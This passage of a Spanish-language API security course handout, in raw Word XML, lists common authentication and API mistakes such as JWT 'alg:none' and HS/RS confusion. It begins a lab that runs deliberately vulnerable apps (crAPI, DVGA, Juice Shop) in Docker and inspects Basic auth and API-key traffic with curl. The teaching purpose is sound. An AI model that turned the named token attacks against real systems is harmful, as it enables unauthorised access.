            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>alg</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> tomado del token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>alg:none</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>, confusión HS/RS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Algoritmo desde la configuración (RFC 8725)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JWT de larga vida sin revocación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No se puede cortar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Vida corta + rotación/introspección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Refresh token enviado a la API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Confusión de roles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Solo contra el endpoint de token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ID token usado como access token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Token para la app, no para el recurso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Access token para la API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Firma no verificada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Cualquiera forja tokens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Verificar firma siempre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 xml:space="preserve">Sin validación de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aud</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>/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iss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Token robado de otra app sirve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Validar emisor y audiencia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Rate limit solo por IP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Trivial de rotar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Limitar por identidad y por recurso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Paginación sin tope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Consumo ilimitado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Límites máximos y cuotas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Errores verbosos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Filtran rutas y versiones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Mensajes genéricos al cliente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 xml:space="preserve">CORS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*</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> con credenciales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Cualquier sitio llama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Orígenes explícitos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mTLS terminado en proxy sin reenvío de identidad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Se pierde la identidad del cliente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Propagar la identidad verificada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Cuentas de servicio compartidas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No hay trazabilidad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Identidades únicas y de vida corta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API keys eternas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Sin rotación ni revocación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Rotación, revocación, allowlist</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>introspection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>/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debug</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> abiertos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Fuga de información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Cerrar en producción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Versionado incontrolado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Shadow/zombie APIs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Catálogo y deprecación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Confiar en datos de terceros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Inyección por cadena de suministro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Validar toda entrada externa (Api10)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Logs con tokens o PII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Fuga por observabilidad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Redacción y minimización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6.21 Fuentes ampliadas de esta sección</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OWASP:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId23">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">API Security Top 10 (2023)</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId28">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">WSTG</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId29">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">SAMM</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId30">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Cheat Sheets</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>NIST:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId31">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">SP 800-63-4 (2025)</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId32">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">SP 800-207 Zero Trust</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId33">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">SP 800-61 (IR)</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId34">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Cybersecurity Framework 2.0</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>IETF:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> RFC 6749 · 6750 · 7515–7519 · 7523 · 7636 · 7662 · 7009 · 8176 · 8252 · 8705 · 8725 · 9068 · 9449 · 9700</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Uruguay:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId35">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">CERTuy</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId36">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">AGESIC</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId37">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Ley 18.331 — URCDP</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · Documentación técnica de </w:t>
      </w:r>
      <w:hyperlink r:id="rId38">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">ID Uruguay</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Laboratorios:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId24">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">OWASP crAPI</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId25">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Juice Shop</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId26">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">PortSwigger Academy</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · DVGA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>7. Laboratorio paso a paso (con ejemplos)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Anexo práctico de la clase "De Basic al DPoP".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Pensado para tenerlo abierto el día de la charla: cada paso tiene comando, resultado esperado y "qué demuestra".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">⚠️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Seguridad primero.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Todos los ataques se ejecutan contra </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>laboratorios locales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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>127.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) o endpoints públicos de práctica. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Nunca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> contra sistemas de terceros sin autorización escrita. ID Uruguay se aborda </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sólo en modo defensivo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, con tu propia cuenta y tu propio cliente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">🖥️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Entorno.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Los comandos están en sintaxis bash. En Windows usá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Git Bash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>WSL2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. Requiere: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>docker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python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3.10+, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>curl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git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jq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (opcional). Verificalo en el Paso 0.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>7.1 Entorno de laboratorio seguro</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Levantá todo con Docker, sin tocar producción de nadie.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# OWASP crAPI (API intencionalmente vulnerable, con BOLA, JWT, etc.)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker compose --file https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml up -d</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># DVGA (Damn Vulnerable GraphQL Application)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application &amp;&amp; cd Damn-Vulnerable-GraphQL-Application</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker build -t dvga . &amp;&amp; docker run -d -p 5013:5013 dvga</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Keycloak (OIDC/OAuth real para practicar PKCE, refresh, DPoP)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker run -d -p 8080:8080 -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak:latest start-dev</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Juice Shop (web + API)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker run -d -p 3000:3000 bkimminich/juice-shop</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Herramientas: Burp Suite Community o ZAP, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jwt_tool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ffuf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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>gobuster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nuclei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gitleaks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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>ggshield</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, Postman/Insomnia, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>k6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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>ab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Parte A — Calentamiento sin riesgo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 0 — Verificar herramientas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docker --version</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python --version</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl --version | head -1</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>git --version</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> versiones de cada herramienta. Si falta </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: Windows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>winget install jqlang.jq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, Linux </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>sudo apt install jq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 1 — HTTP Basic: ver y decodificar credenciales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## Endpoint público de práctica (NO es un sistema de terceros)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -u usuario:clave https://httpbin.org/basic-auth/usuario/clave</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## Mirar la cabecera que viaja</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -D - -o /dev/null -u usuario:clave https://httpbin.org/basic-auth/usuario/clave | grep -i authorization</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> JSON </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>{"authenticated": true, "user": "usuario"}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y una cabecera </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Authorization: Basic dXN1YXJpbzpjbGF2ZQ==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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las credenciales viajan en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> request.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## Base64 NO es cifrado</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo -n "dXN1YXJpbzpjbGF2ZQ==" | base64 -d; echo</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado: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1F3B66"/>
        </w:rPr>
        <w:t>usuario:clave</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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cualquiera que intercepte el tráfico lee la credencial.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 2 — API key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curl -s -H "X-API-Key: clave-de-ejemplo" https://httpbin.org/headers | jq '.headers' 2&gt;/dev/null || curl -s -H "X-API-Key: clave-de-ejemplo" https://httpbin.org/headers</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> aparece </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>"X-Api-Key": "clave-de-ejemplo"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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la clave viaja en claro en una cabecera estática; si se filtra, no expira sola.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## Buscar secretos en TU propio repositorio (no ajenos)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest detect --source /repo -v</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> reporte (posiblemente vacío en un repo limpio).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cómo se descubren claves hardcodeadas en repos y CI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 3 — OAuth 1.0: entender la firma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cat &gt; oauth1_sign.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
